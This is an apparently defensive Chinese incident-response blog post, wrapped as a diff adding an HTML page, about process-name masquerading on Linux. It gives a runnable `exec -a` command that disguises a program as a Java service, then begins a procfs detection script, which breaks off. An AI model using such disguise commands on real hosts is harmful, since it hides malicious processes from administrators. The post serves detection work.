@@ -1,0 +1,725 @@
+<!DOCTYPE html><html dir="ltr" lang="en" class="overflow-y-scroll scroll-smooth"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.png"><link rel="icon" href="/favicon.png"><link rel="canonical" href="https://synex.space/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux-%E5%B8%B8%E8%A7%81%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%88%86%E6%9E%90/"><meta name="generator" content="Astro v7.0.3"><!-- Font --><style>@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/2213c1e7fbe06cc7.woff") format("woff"), url("/_astro/fonts/b87f789471b4c602.ttf") format("truetype");font-display:swap;font-weight:300;font-style:italic;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/c487dbd9c215141e.woff") format("woff"), url("/_astro/fonts/bb0c016d60298234.ttf") format("truetype");font-display:swap;font-weight:400;font-style:italic;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/0976c79a1e97c08d.woff") format("woff"), url("/_astro/fonts/b3e69a4f03324880.ttf") format("truetype");font-display:swap;font-weight:500;font-style:italic;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/3c46d5a1dde2929d.woff") format("woff"), url("/_astro/fonts/0ff1dfaf1dff21d0.ttf") format("truetype");font-display:swap;font-weight:600;font-style:italic;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/e9aa617e80052f4b.woff") format("woff"), url("/_astro/fonts/d9a5ad8b8018e5de.ttf") format("truetype");font-display:swap;font-weight:700;font-style:italic;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/5056f1a50e5e7744.woff") format("woff"), url("/_astro/fonts/3e4dac0d0220e48a.ttf") format("truetype");font-display:swap;font-weight:300;font-style:normal;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/e734307f8c328338.woff") format("woff"), url("/_astro/fonts/ba3036786bf88603.ttf") format("truetype");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/dfa89044152f7da4.woff") format("woff"), url("/_astro/fonts/39aec4e7fc7cc077.ttf") format("truetype");font-display:swap;font-weight:500;font-style:normal;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/8bbd58b325585200.woff") format("woff"), url("/_astro/fonts/b33609507afd910d.ttf") format("truetype");font-display:swap;font-weight:600;font-style:normal;}@font-face{font-family:"Google Sans Code-1a30c214885cb404";src:url("/_astro/fonts/035035a9ddbd14aa.woff") format("woff"), url("/_astro/fonts/50fcf54bf575f53f.ttf") format("truetype");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:300;font-style:italic;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:400;font-style:italic;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:500;font-style:italic;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:600;font-style:italic;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:700;font-style:italic;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:300;font-style:normal;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:500;font-style:normal;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:600;font-style:normal;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}@font-face{font-family:"Google Sans Code-1a30c214885cb404 fallback: Courier New";src:local("Courier New");font-display:swap;font-weight:700;font-style:normal;size-adjust:99.9837%;ascent-override:96.6157%;descent-override:28.6047%;}:root{--font-google-sans-code:"Google Sans Code-1a30c214885cb404","Google Sans Code-1a30c214885cb404 fallback: Courier New",monospace;}</style><!-- Primary meta --><title>应急响应-Linux下常见隐匿攻击手法分析 | Syn3x&#39;s Blog</title><meta name="title" content="应急响应-Linux下常见隐匿攻击手法分析 | Syn3x's Blog"><meta name="description" content="应急响应-Linux下常见隐匿攻击手法分析"><meta name="author" content="Syn3x"><link rel="sitemap" href="/sitemap-index.xml"><!-- Open Graph --><meta property="og:type" content="website"><meta property="og:site_name" content="Syn3x's Blog"><meta property="og:title" content="应急响应-Linux下常见隐匿攻击手法分析 | Syn3x's Blog"><meta property="og:description" content="应急响应-Linux下常见隐匿攻击手法分析"><meta property="og:url" content="https://synex.space/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux-%E5%B8%B8%E8%A7%81%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%88%86%E6%9E%90/"><meta property="og:image" content="https://synex.space/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux-%E5%B8%B8%E8%A7%81%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%88%86%E6%9E%90/index.png"><!-- Twitter / X --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://synex.space/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux-%E5%B8%B8%E8%A7%81%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%88%86%E6%9E%90/"><meta property="twitter:title" content="应急响应-Linux下常见隐匿攻击手法分析 | Syn3x's Blog"><meta property="twitter:description" content="应急响应-Linux下常见隐匿攻击手法分析"><meta property="twitter:image" content="https://synex.space/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux-%E5%B8%B8%E8%A7%81%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%88%86%E6%9E%90/index.png"><!-- RSS autodiscovery --><link rel="alternate" type="application/rss+xml" title="Syn3x's Blog" href="https://synex.space/rss.xml/"><!-- Filled at runtime by theme.ts to match the current background colour --><meta name="theme-color" content=""><!-- Extra head content injected by child layouts (e.g. JSON-LD, article meta) --><meta property="og:type" content="article"><meta property="article:published_time" content="2026-09-12T09:04:00.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"应急响应-Linux下常见隐匿攻击手法分析 | Syn3x's Blog","image":"https://synex.space/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-linux-%E5%B8%B8%E8%A7%81%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%88%86%E6%9E%90/index.png","datePublished":"2026-09-12T09:04:00.000Z","author":[{"@type":"Person","name":"Syn3x","url":"https://synex.space"}]}</script><!--
+      Inline FOUC-prevention script: sets data-theme on <html> before
+      the browser paints. Runs synchronously, no defer/async.
+    --><script>
+      (function () {
+        const stored = localStorage.getItem("theme");
+        const prefersDark = window.matchMedia(
+          "(prefers-color-scheme: dark)"
+        ).matches;
+        const theme = stored ?? (prefersDark ? "dark" : "light");
+        const root = document.firstElementChild;
+        root?.setAttribute("data-theme", theme);
+        root?.classList.toggle("dark", theme === "dark");
+        // Expose value so theme.ts can skip re-detection.
+        window.__theme = { value: theme };
+      })();
+    </script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.2i1RQzKf.js"></script><link rel="stylesheet" href="/_astro/Footer.ChjHkc0Z.css"><style>@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*),[data-astro-transition-scope]{animation:none!important}}
+</style><style>[data-astro-transition-scope="astro-bztu2lml-1"] { view-transition-name: \5E94\6025\54CD\5E94; }@layer astro { ::view-transition-old(\5E94\6025\54CD\5E94) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(\5E94\6025\54CD\5E94) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(\5E94\6025\54CD\5E94) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(\5E94\6025\54CD\5E94) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-bztu2lml-2"] { view-transition-name: \52AB\6301; }@layer astro { ::view-transition-old(\52AB\6301) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(\52AB\6301) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(\52AB\6301) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(\52AB\6301) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-2"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-2"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-2"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-2"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style><style>[data-astro-transition-scope="astro-bztu2lml-3"] { view-transition-name: \653B\9632; }@layer astro { ::view-transition-old(\653B\9632) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(\653B\9632) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(\653B\9632) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(\653B\9632) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-3"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-3"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-bztu2lml-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-bztu2lml-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-bztu2lml-3"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-bztu2lml-3"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body class="bg-background font-app text-foreground selection:bg-accent/75 selection:text-accent-foreground flex min-h-svh flex-col"><a id="skip-to-content" href="#main-content" class="bg-background text-accent absolute inset-s-16 -top-full z-50 px-3 py-2 backdrop-blur-lg transition-all focus:top-4">Skip to content</a><header class="app-layout flex flex-col items-center justify-between sm:flex-row"><div class="border-border bg-background relative flex w-full items-baseline justify-between border-b py-4 sm:items-center sm:py-6"><a href="/" class="absolute py-1 text-xl leading-8 font-semibold whitespace-nowrap sm:static sm:my-auto sm:text-2xl sm:leading-none">Syn3x&#39;s Blog</a><nav id="nav-menu" class="flex w-full flex-col items-center sm:ms-2 sm:flex-row sm:justify-end sm:space-x-4 sm:py-0"><button id="menu-btn" class="focus-outline self-end p-2 sm:hidden" aria-label="Open menu" aria-expanded="false" aria-controls="menu-items" data-label-open="Open menu" data-label-close="Close menu"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="hidden" viewBox="0 0 24 24" id="close-icon"><path stroke="none" d="M0 0h24v24H0z" /><path d="M18 6 6 18M6 6l12 12" /></svg><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="icon icon-tabler icons-tabler-outline icon-tabler-menu-deep" viewBox="0 0 24 24" id="menu-icon"><path stroke="none" d="M0 0h24v24H0z" /><path d="M4 6h16M7 12h13M10 18h10" /></svg></button><ul id="menu-items" class="[&amp;&gt;li&gt;a]:hover:text-accent mt-4 hidden w-44 grid-cols-2 place-content-center gap-2 sm:mt-0 sm:flex sm:w-auto sm:gap-x-5 sm:gap-y-0 sm:[&amp;&gt;li]:h-8 [&amp;&gt;li&gt;a]:block [&amp;&gt;li&gt;a]:px-4 [&amp;&gt;li&gt;a]:py-3 [&amp;&gt;li&gt;a]:text-center [&amp;&gt;li&gt;a]:font-medium sm:[&amp;&gt;li&gt;a]:px-2 sm:[&amp;&gt;li&gt;a]:py-1"><li class="col-span-2"><a href="/posts/" class="active-nav">Posts</a></li><li class="col-span-2"><a href="/tags/">Tags</a></li><li class="col-span-2"><a href="/friends/">Friends</a></li><li class="col-span-2"><a href="/about/">About</a></li><li class="col-span-2"><a href="/archives/" title="Archives" aria-label="Archives" class="group inline-flex items-center gap-1 hover:text-accent focus-outline flex size-full justify-center p-3 sm:relative sm:size-8 sm:p-0"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="hidden sm:absolute sm:top-1/2 sm:left-1/2 sm:block sm:size-6 sm:-translate-x-1/2 sm:-translate-y-1/2" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M3 6a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v0a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8M10 12h4" /></svg><span class="sm:sr-only">Archives</span></a></li><li class="col-span-1 flex items-center justify-center"><a href="/search/" title="Search" aria-label="Search" class="group inline-flex items-center gap-1 hover:text-accent focus-outline relative size-8"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="absolute top-1/2 left-1/2 size-6 -translate-x-1/2 -translate-y-1/2" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M3 10a7 7 0 1 0 14 0 7 7 0 1 0-14 0M21 21l-6-6" /></svg><span class="sr-only">Search</span></a></li><li class="col-span-1 flex items-center justify-center"><button id="theme-btn" class="focus-outline hover:[&amp;&gt;svg]:stroke-accent relative size-12 p-4 sm:size-8" title="Toggle theme" aria-label="auto" aria-live="polite"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="absolute top-[50%] left-[50%] translate-[-50%] scale-100 rotate-0 transition-all dark:scale-0 dark:-rotate-90" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M12 3h.393a7.5 7.5 0 0 0 7.92 12.446A9 9 0 1 1 12 2.992z" /></svg><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="absolute top-[50%] left-[50%] translate-[-50%] scale-0 rotate-90 transition-all dark:scale-100 dark:rotate-0" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M14.828 14.828a4 4 0 1 0-5.656-5.656 4 4 0 0 0 5.656 5.656M6.343 17.657l-1.414 1.414M6.343 6.343 4.929 4.929M17.657 6.343l1.414-1.414M17.657 17.657l1.414 1.414M4 12H2M12 4V2M20 12h2M12 20v2" /></svg></button></li></ul></nav></div></header><script type="module">function e(){let e=document.querySelector(`#menu-btn`),t=document.querySelector(`#menu-items`),n=document.querySelector(`#menu-icon`),r=document.querySelector(`#close-icon`);if(!e||!t||!n||!r)return;let i=e.dataset.labelOpen??`Open menu`,a=e.dataset.labelClose??`Close menu`;e.addEventListener(`click`,()=>{let o=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,o?`false`:`true`),e.setAttribute(`aria-label`,o?i:a),t.classList.toggle(`hidden`),t.classList.toggle(`grid`),n.classList.toggle(`hidden`),r.classList.toggle(`hidden`)})}e(),document.addEventListener(`astro:after-swap`,e);</script><div class="app-layout flex items-center justify-start"><a id="back-button" href="/" class="group inline-flex items-center gap-1 hover:text-accent focus-outline hover:text-foreground/75 -ms-2 mt-8 mb-2"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 rtl:rotate-180" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="m15 6-6 6 6 6" /></svg><span>Go back</span></a></div><script type="module">function e(){let e=document.querySelector(`#back-button`),t=sessionStorage.getItem(`backUrl`);t&&e&&(e.href=t)}document.addEventListener(`astro:page-load`,e),e();</script><main id="main-content" class="app-layout" data-pagefind-body><div class="xl:grid xl:grid-cols-[minmax(0,1fr)_13rem] xl:gap-x-10"><div><h1 style="view-transition-name:u005e94u006025u0054cdu005e94-linuxu004e0bu005e38u0089c1u009690u00533fu00653bu0051fbu00624bu006cd5u005206u006790" class="text-accent inline-block text-2xl font-bold sm:text-3xl">应急响应-Linux下常见隐匿攻击手法分析</h1><div class="my-2 flex items-center gap-2"><div class="text-muted-foreground flex items-center gap-x-2"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 min-w-5.5" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M4 7a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2zM16 3v4M8 3v4M4 11h16M7 14h.013M10.01 14h.005M13.01 14h.005M16.015 14h.005M13.015 17h.005M7.01 17h.005M10.01 17h.005" /></svg><time class="text-sm sm:text-base" datetime="2026-09-12T09:04:00.000Z">12 Sep, 2026</time></div><span aria-hidden="true" class="text-muted-foreground max-sm:hidden hidden">|</span></div><article id="article" class="app-prose max-w-app prose-pre:bg-(--shiki-light-bg) dark:prose-pre:bg-(--shiki-dark-bg) mt-8 w-full"><h2 id="进程名伪装">进程名伪装</h2>
+<h3 id="攻击原理">攻击原理</h3>
+<p>攻击者利用 Linux 进程创建时 <code>execve()</code> 对 <code>argv[0]</code> 可控的特性，在启动程序时伪造进程命令行参数，使 <code>/proc/&#x3C;pid>/cmdline</code> 等用户态接口展示为正常业务名称，从而造成进程展示信息与真实执行文件不一致，达到进程伪装的目的。</p>
+<h3 id="实现方案">实现方案</h3>
+<p>程序直接执行的情况下，例如下面放到后台执行</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">nohup</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> ./simulation</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> &#x26;</span></span></code></pre>
+<p>默认情况下，通过 ps、top 等基于 procfs 的工具可以看到真实的进程命令信息。
+<img src="https://static.synex.space/images/2026/10/02/233c407021c3-Pasted-image-20260908121717.png" alt="">
+可以通过下面命令把进程伪装成一个java业务，伪装一般会用当前主机跑的真实业务去当做进程命令信息。</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">nohup</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> bash</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -c</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">exec -a "java -Xms512m -Xmx1024m -jar app.jar" ./simulation</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> &#x26;</span></span></code></pre>
+<p><img src="https://static.synex.space/images/2026/10/02/d4cc814b50ed-Pasted-image-20260908122535.png" alt="">
+在通过<code>exec -a</code>去执行的时候会在系统调用<code>execve()</code>的时候指定新的<code>argv[0]</code>，该参数会作为进程启动时的 <code>argv[0]</code> 传入，而 <code>/proc/&#x3C;pid>/cmdline</code> 会读取进程的 argv 数据，因此最终会影响 cmdline 展示内容。，通过cmdline去识别进程名字的都会受到影响。
+<img src="https://static.synex.space/images/2026/10/02/4cc8e438ee65-Pasted-image-20260908122802.png" alt="">
+对于<code>execve()</code>的执行参数可以通过下面命令进行确定</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">strace</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -f</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -e</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> execve</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> bash</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -c</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">exec -a "java -jar app.jar" ./simulation</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span></span></code></pre>
+<p><img src="https://static.synex.space/images/2026/10/02/f99fbaaa0993-Pasted-image-20260908125014.png" alt=""></p>
+<h3 id="排查方案">排查方案</h3>
+<p>可以通过下面脚本寻找在procfs中comm与cmdline不同的进程，但仅用于可疑参考，不能把当前结果当做实际确定结果。</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#EA76CB;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">for</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478"> pid</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> in</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> /proc/[0-9</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">]</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">*</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> do</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">    pid</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">${</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">pid</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">##*/</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">}</span></span>
